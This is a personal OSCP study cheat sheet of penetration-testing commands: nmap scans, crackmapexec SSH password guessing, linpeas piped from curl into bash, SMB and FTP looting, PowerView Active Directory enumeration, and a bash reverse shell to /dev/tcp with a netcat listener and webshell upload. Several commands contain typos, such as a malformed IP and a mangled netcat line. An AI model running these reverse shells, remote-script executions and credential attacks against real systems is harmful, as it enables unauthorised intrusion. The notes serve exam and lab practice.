## OSCP Cheatsheet

# General
# Red flags to check
config file
# PDF Files
Run in directory with the pdf files to get more info
```
exiftool *.pdf
```

# nmap

``` 
nmap -sC -sV -OA 10.10.123.43
```
# ssh
you can crack map exec if you have
```
cme ssh 1010.11.247 -u users..txt -p 'sdfasdfsa'
```

if you login to ssh you should check the home directory
```
find . -type f
```

then  
```
ls -la
```

when  you get an ssh, you can upload winpeas/linpeas for privesc
```
mkdir www
cd www
cp /opt/peas/linpeas.sh .
python3 -m http.server
```
back to ssh
```
curl 10.10.13.1423(your ip):8000/linpeas.sh | bash

```



# ftp

download multiple files
```
wget -r ftp://10.10.11.123
```

# PowerView
GetNetUser - enumerate user info
```
objectsid : *-500 = admin
```
filter out just for cn
```
GetNetUser | select cn
``` 

GetNetUser | select cn, objectsid, adspath

if you want to enumerate for specific user

```
GetNetUser -UserName Admin
```

Enumerate Groups
```
Get-NetGroup
```
list of groups that username is a part of
```
Get-NetGroup -Username Admin	
Get-NetGroupMember -groupname “adminsitrators”
```

part of AD env requires more than 1 computer or else it doesn't make sense to run AD
if you access a domain controller and you want to find out what computers you can compromise with administrator privilieges
```
Find-LocalAdminAccess
```

# SMB
```
netexec smb 10.10.14.31
netexec smb 10.10.14.31  -- shares
netexec smb 10.10.14.31  -- shares -u  ‘’ -p ‘’ #null login
netexec smb 10.10.14.31  -- shares -u  ‘DoesNotExist’ -p ‘’ #anonymous login. 
```
to specify no password
```
smbclient -N //10.10.13.31/ # -N 
```

in smb
to download everything in the directory
```
>RECURSE on
>prompt
>mget *
```

# SHELL
when you can get command injection
```
bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
```
different window
```
nc lvnp -9001
```
back to shell
```
python3 -c ‘import pty;pty.spawn("bin/bash")’
background this (ctrl+z)
stty raw -echo; fg
export TERM=xterm
```

upload a shell from = /usr/share/webshells/...
edit the shell code
run netcat listening on the port

run this command to get a shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

OR 

if we get a shell but it is not stable,

use this payload 

bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"

# Linpeas
generally check new titles or stuff with a lot of red
you want to avoid the kernel exploits until the last step because generally they are unreliable
check the recon first



<p>
  someone's blog
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
  
</p>
